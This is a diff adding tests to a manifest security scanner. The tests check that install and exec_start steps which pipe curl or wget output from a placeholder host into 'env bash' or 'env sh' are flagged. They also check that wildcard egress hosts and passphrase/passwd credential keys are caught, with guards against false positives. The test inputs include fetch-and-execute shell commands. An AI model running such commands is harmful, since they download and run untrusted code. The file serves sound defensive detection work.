@@ -207,3 +207,55 @@ test("HARDENED: short cred tokens do not false-positive on benign keys", () => {
     assert.equal(hasHigh({ config: [{ key }] }), false, key);
   }
 });
+
+// ---------------------------------------------------------------------------
+// Re-audit blind spots (parity harness): 3 evasions BOTH engines must catch.
+// Mirrors core's TestScanManifest additions (internal/marketplace/scan.go).
+// ---------------------------------------------------------------------------
+
+// Blind spot #1: pipe-to-shell via `env` invoking a shell (space before the
+// interpreter, no slash-prefix on the shell name).
+test("RE-AUDIT #1: pipe to `env <shell>` is caught (high)", () => {
+  for (const step of [
+    "curl -s http://e/i | /usr/bin/env bash",
+    "wget -qO- http://e/i | env sh",
+    "curl http://e/i.py | env -S python3",
+    "curl http://e/i | env VAR=v bash",
+  ]) {
+    assert.ok(hasHigh({ host_native: { install: [step] } }), step);
+  }
+  // exec_start form is a HARD fail too.
+  const findings = scanManifest({ host_native: { exec_start: "curl http://e/run | env bash" } });
+  assert.ok(findings.some((f) => f.severity === "high" && f.field === "host_native.exec_start"));
+});
+
+// Benign guard: an `env`-prefixed binary launch WITHOUT a pipe must stay clean.
+test("RE-AUDIT #1: env-prefixed exec without a pipe is clean", () => {
+  assert.equal(hasHigh({ host_native: { exec_start: "/usr/bin/env node dist/main.js" } }), false);
+});
+
+// Blind spot #2: suffix / embedded wildcard egress (`evil*`, `e*il.com`).
+test("RE-AUDIT #2: suffix/embedded wildcard egress is caught (high)", () => {
+  for (const hosts of [["evil*"], ["e*il.com"], ["evil*.com"]]) {
+    assert.deepEqual(highFields({ openapi: { allowed_hosts: hosts } }), ["openapi.allowed_hosts"], JSON.stringify(hosts));
+  }
+});
+
+// Benign guard: exact (non-wildcard) hosts must stay clean.
+test("RE-AUDIT #2: exact hosts are not flagged", () => {
+  assert.equal(hasHigh({ openapi: { allowed_hosts: ["api.example.com", "cdn.example.com"] } }), false);
+});
+
+// Blind spot #3: `passphrase` / `passwd` whole-word credential hints.
+test("RE-AUDIT #3: passphrase/passwd credential hints are caught (high)", () => {
+  for (const key of ["vault_passphrase", "passphrase", "db_passwd", "passwd"]) {
+    assert.ok(hasHigh({ config: [{ key }] }), key);
+  }
+});
+
+// Benign guard: `path`/`pattern` must NOT trip the new cred hints.
+test("RE-AUDIT #3: path/pattern stay clean", () => {
+  for (const key of ["file_path", "match_pattern", "retry_pattern"]) {
+    assert.equal(hasHigh({ config: [{ key }] }), false, key);
+  }
+});
